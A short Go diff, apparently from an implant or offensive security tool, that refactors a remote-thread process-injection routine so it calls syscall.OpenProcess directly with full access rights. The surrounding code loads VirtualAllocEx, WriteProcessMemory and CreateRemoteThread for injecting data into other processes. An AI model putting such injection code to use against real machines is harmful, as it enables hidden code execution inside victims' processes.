@@ -71,7 +71,6 @@ var (
 	kernel32           = syscall.MustLoadDLL("kernel32.dll")
 	virtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
 	virtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
-	openProcess        = kernel32.MustFindProc("OpenProcess")
 	writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
 	createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
 	createThread       = kernel32.MustFindProc("CreateThread")
@@ -142,21 +141,9 @@ func injectTask(processHandle Handle, data []byte) error {
 	return nil
 }
 
-// openProcessHandle - Returns the handle for a given process id
-func openProcessHandle(processID int) (Handle, error) {
-	log.Println("obtaining process handle for pid ...")
-	handle, _, err := openProcess.Call(ptr(PROCESS_ALL_ACCESS), ptr(false), ptr(processID))
-	log.Printf("openprocess returned: handle = %v, err = %v", handle, err)
-	if handle == 0 {
-		log.Println("[!] failed to obtain process handle")
-		return 0, err
-	}
-	return Handle(handle), nil
-}
-
 // RemoteThreadTaskInjection - Injects Task into a processID using remote threads
 func remoteThreadTaskInjection(processID int, data []byte) error {
-	processHandle, err := openProcessHandle(processID)
+	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
 	if processHandle == 0 {
 		return err
 	}
